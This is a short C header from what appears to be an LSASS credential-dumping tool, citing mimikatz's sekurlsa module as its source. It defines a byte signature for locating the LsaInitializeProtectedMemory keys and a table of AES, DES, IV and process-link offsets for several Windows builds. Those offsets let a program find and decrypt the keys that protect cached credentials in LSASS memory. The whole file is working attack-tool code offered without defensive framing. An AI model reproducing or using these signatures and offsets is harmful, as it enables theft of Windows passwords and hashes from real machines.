#pragma once
typedef struct {
    char* WindowsVersion;
    unsigned char* credentialKeySig;
    int KeySigSize;
    int AES_OFFSET;
    int DES_OFFSET;
    int IV_OFFSET;
    int ActiveProcessLinksOffset;
} LsassCredentialKeyOffsets;


// https://github.com/gentilkiwi/mimikatz/blob/152b208916c27d7d1fc32d10e64879721c4d06af/mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c

unsigned char PTRN_WN10_LsaInitializeProtectedMemory_KEY[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };

// Version, Credential Key Signature, Key Signature Size, AES, DES, IV, ActiveProcessLinks member offset
// Mimikatz has theirs formatted as: IV, DES, AES
LsassCredentialKeyOffsets LsassKeyOffsetsArray[] = {
{"1607", PTRN_WN10_LsaInitializeProtectedMemory_KEY, sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY), 16, -73, 61, 0x2f0},
{"1809", PTRN_WN10_LsaInitializeProtectedMemory_KEY, sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY), 16, -89, 67, 0x2e8},
{"21H2", PTRN_WN10_LsaInitializeProtectedMemory_KEY, sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY), 16, -89, 67, 0x448},
{"22H2", PTRN_WN10_LsaInitializeProtectedMemory_KEY, sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY), 16, -89, 67, 0x448}
};